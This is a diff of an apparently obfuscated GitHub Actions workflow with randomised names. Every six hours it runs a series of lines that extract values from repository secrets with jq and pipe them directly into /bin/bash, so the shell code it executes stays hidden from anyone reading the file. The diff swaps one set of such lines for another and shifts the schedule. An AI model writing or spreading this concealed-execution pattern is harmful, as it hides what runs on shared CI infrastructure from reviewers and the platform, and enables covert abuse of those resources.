@@ -1,8 +1,10 @@
 name: lujingxi3456
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '2 3/6 * * *'
+    - cron: '7 2/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -10,22 +12,12 @@ jobs:
       - uses: actions/checkout@v4
       - name: lujingxi3456
         env:
-          sjyrw67: ${{ secrets.sjyrw67 }}
+          ehasq0978: ${{ secrets.ehasq0978 }}
         run: |
-          echo $sjyrw67 | jq -r .bbk5105 | /bin/bash
-          echo $rs733 | jq -r .t037 | /bin/bash
-          echo $sh1729 | jq -r .gftxl5 | /bin/bash
-          echo $hs5188 | jq -r .y6 | /bin/bash
-          echo $nzvoq32 | jq -r .egd633 | /bin/bash
-          echo $kmvt3660 | jq -r .qwjb975 | /bin/bash
-          echo $zip5297 | jq -r .tut03 | /bin/bash
-          echo $b4992 | jq -r .qcfrg43 | /bin/bash
-          echo $kcpw98757 | jq -r .nnofy81 | /bin/bash
-          echo $nvnlc905 | jq -r .bgupm069 | /bin/bash
-          echo $hmwej29525 | jq -r .rwey55381 | /bin/bash
-          echo $qh7662 | jq -r .rpnt3 | /bin/bash
-          echo $bz6856 | jq -r .ks20 | /bin/bash
-          echo $xutu77 | jq -r .byzeg66 | /bin/bash
-          echo $wh29 | jq -r .c7645 | /bin/bash
-          echo $au5 | jq -r .pv043 | /bin/bash
+          echo $ehasq0978 | jq -r .bz180 | /bin/bash
+          echo $hylid7811 | jq -r .z71 | /bin/bash
+          echo $gbw60977 | jq -r .qg86253 | /bin/bash
+          echo $o9393 | jq -r .owpf488 | /bin/bash
+          echo $lfz8656 | jq -r .v00 | /bin/bash
+          echo $tan11 | jq -r .l8 | /bin/bash
 
